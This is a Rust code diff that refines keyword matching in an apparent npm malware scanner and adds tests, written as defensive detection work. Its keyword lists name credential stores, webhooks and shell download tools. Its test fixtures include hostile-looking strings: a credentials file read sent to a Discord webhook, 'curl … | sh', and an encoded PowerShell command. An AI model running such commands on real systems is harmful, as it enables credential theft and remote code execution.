@@ -344,21 +344,19 @@ fn straddles(lower: &[String], chunk: usize, needle: &str) -> Option<String> {
 }
 
 fn any_contains(table: &[String], needles: &[&str]) -> Option<String> {
-    // A short bare word (`iex`) only as a word: `XiExy` is a random fragment.
+    // A needle only as a whole word or path component: `XiExy` is a random
+    // fragment, `client_credentials` an OAuth grant type and `spawnErrorCode`
+    // a property name. A needle's own punctuation (`.env`, `curl `) bounds it.
     // `credentials` and `withCredentials` alone are fetch/XHR options, not a
     // credentials file (`.aws/credentials` still is).
+    let word = |b: Option<&u8>| b.is_some_and(|b| b.is_ascii_alphanumeric() || *b == b'_');
     let has = |lower: &str, n: &str| {
-        if n.len() > 3 || !n.bytes().all(|b| b.is_ascii_alphanumeric()) {
-            return lower.contains(n)
-                && !(n == "credentials" && matches!(lower, "credentials" | "withcredentials"));
-        }
-        lower.match_indices(n).any(|(i, _)| {
-            let b = lower.as_bytes();
-            !(i > 0 && b[i - 1].is_ascii_alphanumeric())
-                && !b
-                    .get(i + n.len())
-                    .is_some_and(|c| c.is_ascii_alphanumeric())
-        })
+        let (b, nb) = (lower.as_bytes(), n.as_bytes());
+        !(n == "credentials" && lower == "credentials")
+            && lower.match_indices(n).any(|(i, _)| {
+                !(word(nb.first()) && i > 0 && word(b.get(i - 1)))
+                    && !(word(nb.last()) && word(b.get(i + n.len())))
+            })
     };
     // A JSON object of a kilobyte or more is bundled data (mime-db's type
     // table in bethetamer), not a name the code uses.
@@ -387,7 +385,17 @@ pub fn chains(rel_path: &str, table: &[String]) -> Vec<RuleMatch> {
         context: format!("Obfuscated string table holds: {}", parts.join(" + ")),
     };
 
-    let read = any_contains(table, &["readfile", "readdir", "createreadstream"]);
+    // Whole names, so the `Sync` and plural forms are listed.
+    let read = any_contains(
+        table,
+        &[
+            "readfile",
+            "readfilesync",
+            "readdir",
+            "readdirsync",
+            "createreadstream",
+        ],
+    );
     let secret = any_contains(
         table,
         &[
@@ -399,7 +407,9 @@ pub fn chains(rel_path: &str, table: &[String]) -> Vec<RuleMatch> {
             "login data",
             "local storage",
             "wallet",
+            "wallets",
             "keychain",
+            "keychains",
             "cookies",
             ".aws",
             "credentials",
@@ -413,6 +423,7 @@ pub fn chains(rel_path: &str, table: &[String]) -> Vec<RuleMatch> {
             "multipart",
             "upload",
             "webhook",
+            "webhooks",
             "https://",
             "http://",
         ],
@@ -431,6 +442,7 @@ pub fn chains(rel_path: &str, table: &[String]) -> Vec<RuleMatch> {
             "/bin/bash",
             "execsync",
             "spawn",
+            "spawnsync",
         ],
     );
     let cradle = any_contains(
@@ -448,6 +460,7 @@ pub fn chains(rel_path: &str, table: &[String]) -> Vec<RuleMatch> {
             "wget ",
             "windowstyle",
             "-enc",
+            "-encodedcommand",
         ],
     );
     if let (Some(s), Some(c)) = (shell, cradle) {
@@ -609,6 +622,54 @@ mod tests {
             )),
             vec![OBFUSCATED_DOWNLOAD_EXEC]
         );
+    }
+
+    #[test]
+    fn a_needle_inside_a_longer_name_is_not_a_step() {
+        let table = |t: &[&str]| t.iter().map(|s| s.to_string()).collect::<Vec<_>>();
+        // Closed-source CLIs run through javascript-obfuscator (new npm releases).
+        for benign in [
+            vec!["readFileSync", "client_credentials", "POST"],
+            vec![
+                "readFileSync",
+                "walletAddress",
+                "postMessage",
+                "uploadProgress",
+            ],
+            vec!["readFileSync", "process.environment", "POST"],
+            vec!["spawnErrorCode", "curl https://api.acme.dev/v1"],
+            vec!["child_process", "confirm ", "-encoding"],
+        ] {
+            assert!(chains("cli.js", &table(&benign)).is_empty(), "{benign:?}");
+        }
+        for (theft, name) in [
+            (
+                vec![
+                    "readdirSync",
+                    "/home/u/.aws/credentials",
+                    "https://discord.com/api/webhooks/1/x",
+                ],
+                OBFUSCATED_CREDENTIAL_THEFT,
+            ),
+            (
+                vec![
+                    "fs.readFile",
+                    "Library/Keychains/login.keychain-db",
+                    "/upload",
+                ],
+                OBFUSCATED_CREDENTIAL_THEFT,
+            ),
+            (
+                vec!["spawnSync", "curl https://api.acme.dev/x | sh"],
+                OBFUSCATED_DOWNLOAD_EXEC,
+            ),
+            (
+                vec!["node:child_process", "powershell -EncodedCommand ZQBj"],
+                OBFUSCATED_DOWNLOAD_EXEC,
+            ),
+        ] {
+            assert_eq!(names(&chains("cli.js", &table(&theft))), vec![name]);
+        }
     }
 
     #[test]
